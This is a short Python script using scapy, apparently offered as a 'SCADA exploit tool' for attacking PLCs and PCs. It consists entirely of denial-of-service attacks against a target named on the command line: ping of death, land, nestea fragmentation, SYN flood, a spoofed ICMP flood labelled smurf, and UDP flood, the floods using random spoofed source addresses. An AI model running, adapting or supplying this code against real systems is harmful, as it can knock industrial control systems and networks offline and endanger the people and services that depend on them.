#!/usr/bin/python
#
#function: basic exploit for PLC and PC in SCADA system
#Author: Wei Gao
#Release Date: Aug 10 2012
#Email: wg135@msstate.edu

from sys import argv
from os import geteuid
from scapy.all import *
import socket
import random

#my logo:
def head():
  print " ||=============================================================||"
  print " ||                                                             ||"
  print " ||      /      \               SCADA exploit tools             ||"
  print " ||   \  \  ,,  /  /--------------------------------------------||"
  print " ||    '-.`\()/`.-'          ===========================        ||"
  print " ||   .--_'(  )'_--.              by Wei Gao                    ||"
  print " ||  / /` /`**`\ `\ \                                           ||"
  print " ||   |  |  ri  |  |                                            ||"
  print " ||   \  \      /  /                                            ||"
  print " ||       '.__.'                                                ||"
  print " ||                                                             ||"
  print " ||=============================================================||"
  
#check the program argument
def usage():
    if len(argv) !=4  or argv[2] in {"-h", "help", "--h", "--help"}:
      print "[!] Usage: ./exploit.py <interface> -argument <victim>"
      sys.exit(0)

#check root
def isroot():
  if geteuid() != 0:
    print "TRY AGAIN AS ROOT ..."
    return False
  else:
    return True

#Ping of death attack
def ping_of_death(target, face):
    for i in range(1, 20000):
       send(fragment(IP(dst=target)/ICMP()/("X"*60000)), iface =face)

#land attack
def land_attack(target, target_port, face):
    for i in range(1, 20000):
       send(IP(src = target, dst = target)/TCP(sport=target_port, dport=target_port), iface = face)


#nestea attack (target to linux 2.0 or 2.1)
def nestea_attack(target, face):
    for i in range(1, 80000):
      send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10), iface = face)
      send(IP(dst=target, id=42, frag=48)/("X"*116), iface = face)
      send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224), iface = face)

#SYN_Flood //need to be large number!
def syn_flood(target, target_port, face):
   for i in range(1, 80000):
     resource = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
     send(IP(src = resource, dst = target)/TCP(sport = random.randint(1, 65535), dport = target_port, flags = "S" ), iface = face) 


#smurf attack
def smurf_attack(target, face):
  for i in range(1, 80000):
    resource = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
    send(IP(src =resource, dst =target)/ICMP(), iface = face)    

#UDP-Flood  need large number of attack
def udp_flood(target, face):
  for i in range(1, 80000):
    resource = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
    send(IP(src = resource, dst = target)/UDP(sport = random.randint(1, 65535), dport = random.randint(1, 65535)), iface = face)


def main(argv):
    head()
    if isroot() != True:
      exit(1)
    usage()
    iface = argv[1];
    target = argv[3];
    
    if(argv[2] == "-p"):
      ping_of_death(target, iface)
    if(argv[2] == '-l'):
      land_attack(target, 80, iface)
    if(argv[2] == '-s'):
      syn_flood(target, 80, iface)
    if(argv[2] == '-f'):
      smurf_attack(target, iface)
    if(argv[2] == '-u'):
      udp_flood(target, iface)
    if(argv[2] == '-n'):
      nestea_attack(target, iface)


main(argv)
